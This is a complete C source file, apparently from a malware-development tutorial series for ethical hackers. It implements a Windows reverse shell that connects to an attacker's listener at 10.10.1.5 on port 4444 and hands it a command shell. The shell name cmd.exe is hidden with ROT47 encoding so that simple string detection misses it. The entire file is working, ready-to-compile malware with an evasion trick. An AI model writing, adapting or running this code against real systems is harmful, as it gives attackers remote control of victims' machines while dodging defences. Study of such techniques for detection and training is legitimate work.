/*
 * Malware Development for Ethical Hackers
 * hack.c
 * windows reverse shell 
 * string encoding ROT47
 * author: @cocomelonc
*/
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

void rot47Encrypt(char *str) {
  while (*str) {
    if ((*str >= 33 && *str <= 126)) {
      *str = ((*str - 33 + 47) % 94) + 33;
    }
    str++;
  }
}

void rot47Decrypt(char *str) {
  // ROT47 encryption and decryption are the same
  rot47Encrypt(str);
}

int main(int argc, char* argv[]) {
  // listener ip, port on attacker's machine
  char *ip = "10.10.1.5";
  short port = 4444;

  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;

  // String to be decrypted via ROT47
  char command[] = "4>5]6I6";

  // Decrypt the string using ROT47
  rot47Decrypt(command);

  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

  // start the decrypted command with redirected streams
  CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  exit(0);
}
